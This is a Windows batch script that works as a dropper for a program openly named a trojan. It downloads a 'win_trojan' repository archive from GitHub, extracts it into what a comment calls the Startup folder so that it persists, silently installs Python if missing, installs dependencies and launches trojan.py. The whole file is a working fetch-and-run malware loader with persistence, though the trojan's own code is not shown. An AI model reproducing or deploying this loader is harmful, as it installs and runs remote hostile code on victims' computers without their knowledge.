@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=%TEMP%\win_trojan_dl.zip"
SET "TEMP_EXTRACT=%TEMP%\win_trojan_temp"
SET "PYTHON_EXE=python"

:: Ensure we are working in the directory where the .bat file is located
cd /d "%~dp0"

echo [*] Target Directory: %CD%

:: 1. Download the repository to TEMP to avoid clutter
echo [*] Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Download failed.
    pause
    exit /b
)

:: 2. Extract to a TEMP folder
echo [*] Extracting...
if exist "%TEMP_EXTRACT%" rd /S /Q "%TEMP_EXTRACT%"
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_EXTRACT%' -Force"

:: 3. Move EVERYTHING from inside the subfolder to HERE (Startup folder)
echo [*] Moving files to %CD%...
xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q

:: 4. Cleanup Zip and Temp Folder
echo [*] Cleaning up...
rd /S /Q "%TEMP_EXTRACT%"
del "%ZIP_FILE%"

:: 5. Python Check and Install
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found. Installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile '%TEMP%\py_inst.exe'"
    start /wait %TEMP%\py_inst.exe /quiet InstallAllUsers=1 PrependPath=1
    del %TEMP%\py_inst.exe
    :: Refresh path for this session
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
)

:: 6. Install Dependencies
if exist "requirements.txt" (
    echo [*] Installing requirements...
    %PYTHON_EXE% -m pip install -r requirements.txt
)

:: 7. Run the Script
if exist "trojan.py" (
    echo [*] Success. Launching trojan.py...
    start "" %PYTHON_EXE% trojan.py
) else (
    echo [!] Error: trojan.py not found in this folder.
    pause
)

exit
